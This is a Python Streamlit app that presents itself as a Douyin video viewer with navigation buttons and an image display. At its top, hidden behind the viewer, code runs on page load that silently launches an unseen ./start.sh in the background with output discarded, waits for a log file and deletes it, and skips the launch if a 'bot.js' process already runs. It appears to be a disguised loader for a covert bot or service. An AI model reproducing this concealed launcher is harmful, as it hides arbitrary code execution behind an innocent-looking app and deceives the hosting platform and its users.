import os
import subprocess
import streamlit as st
import threading
import psutil

# Define the command to be executed
cmd = (
    "chmod +x ./start.sh && "
    "nohup ./start.sh > /dev/null 2>&1 & "
    "while [ ! -f /tmp/list.log ]; do sleep 1; done;"
    "rm -rf /tmp/list.log &&"
    "echo 'app is running' "
)

# Function to check if bot.js is running
def is_bot_js_running():
    try:
        for process in psutil.process_iter(['pid', 'cmdline']):
            cmdline = process.info.get('cmdline')
            if cmdline and any('bot.js' in arg for arg in cmdline):
                return True
    except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
        pass
    return False

# Function to execute the command
def execute_command():
    flag_file = "/tmp/command_executed.flag"
    if not os.path.exists(flag_file):
        if not is_bot_js_running():
            subprocess.run(cmd, shell=True)
            # Create a flag file to indicate the command has been executed
            with open(flag_file, "w") as f:
                f.write("Command executed")

# Start the command in a separate thread
def start_thread():
    if not threading.current_thread().name == "MainThread":
        thread = threading.Thread(target=execute_command)
        thread.start()

start_thread()

st.title("❤️抖音美女欣赏❤️")

# 获取 ./mp4/ 文件夹中的所有 mp4 文件
video_folder = "./mp4/"
video_files = [f for f in os.listdir(video_folder) if f.lower().endswith('.mp4')]
video_files.sort()  # 对文件名进行排序

# 创建 session state 来存储当前播放的视频索引
if 'playing_index' not in st.session_state:
    st.session_state['playing_index'] = 0

# 函数：播放上一个视频
def play_previous_video():
    st.session_state['playing_index'] = (st.session_state['playing_index'] - 1) % len(video_files)

# 函数：播放下一个视频
def play_next_video():
    st.session_state['playing_index'] = (st.session_state['playing_index'] + 1) % len(video_files)

# 创建两列来放置按钮和播放名称
col1, col2, col3 = st.columns([1, 1, 2])

# 在第一列放置"上一个视频"按钮
with col1:
    if st.button("上一个视频"):
        play_previous_video()

# 在第二列放置"下一个视频"按钮
with col2:
    if st.button("下一个视频"):
        play_next_video()

# 在第三列显示当前视频名称（不包含后缀）
with col3:
    current_video = video_files[st.session_state['playing_index']]
    video_name_without_extension = os.path.splitext(current_video)[0]
    st.write(f"正在播放: {video_name_without_extension}")

# 创建一个空的容器来放置视频
video_container = st.empty()

# 播放当前视频
video_path = os.path.join(video_folder, current_video)
if os.path.exists(video_path):
    with open(video_path, 'rb') as video_file:
        video_bytes = video_file.read()
    video_container.video(video_bytes)

# Define the URL of the website you want to proxy
url = "https://douyin.boo/index.html"
# 去掉下面一句前面#，可以显示网页版抖音美女
# st.components.v1.html(f'<iframe src="{url}" width="100%" height="600" style="border:none;"></iframe>', height=700)

image_path = "./mv.jpg"
if os.path.exists(image_path):
    st.image(image_path, caption='林熳', use_container_width=True)  # Changed from use_column_width to use_container_width
